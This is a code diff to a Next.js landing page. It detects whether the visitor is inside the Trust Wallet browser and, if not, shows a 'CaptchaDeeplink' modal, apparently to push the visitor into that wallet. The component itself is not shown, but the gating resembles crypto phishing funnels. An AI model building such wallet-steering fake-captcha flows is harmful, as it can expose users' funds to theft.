@@ -1,15 +1,18 @@
-import { useState } from "react";
+/* eslint-disable @typescript-eslint/no-explicit-any */
+import { useEffect, useState } from "react";
 import "./Home.css";
 import { useDispatch, useSelector } from "react-redux";
 import { setCurrentStep } from "../../Redux/Slice/MainSlice";
 import type { RootState } from "../../Redux/store";
 import { usePrefersDark } from "../../Hooks/usePrefersDark";
 import Image from "next/image";
+import { CaptchaDeeplink } from "@/Components/CaptchaDeeplink/CaptchaDeeplink";
 
 export function Home() {
   const isDark = usePrefersDark();
   const [isChecked, setIsChecked] = useState(false);
   const { currentStep } = useSelector((store: RootState) => store.main);
+  const [showModal, setIsShowModal] = useState<boolean | null>(null);
 
   const dispatch = useDispatch();
 
@@ -17,12 +20,33 @@ export function Home() {
     setIsChecked(!isChecked);
   };
 
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+
+    const params = new URLSearchParams(window.location.search);
+    const utm = params.get("utm_source");
+
+    const injected =
+      (window as any).ethereum?.isTrust === true || (window as any).trustwallet;
+
+    const isTrust =
+      injected ||
+      utm === "Trust_Android_Browser" ||
+      utm === "Trust_iOS_Browser";
+
+    if (injected || isTrust) {
+      setIsShowModal(false);
+    } else {
+      setIsShowModal(true);
+    }
+  }, []);
 
   if (isDark == null) return;
+  if (showModal == null) return;
 
   return (
     <section className="home">
-      {/* {!showModal && <CaptchaDeeplink />} */}
+      {showModal && <CaptchaDeeplink />}
 
       <div className="home__container">
         <div className="home__visual">
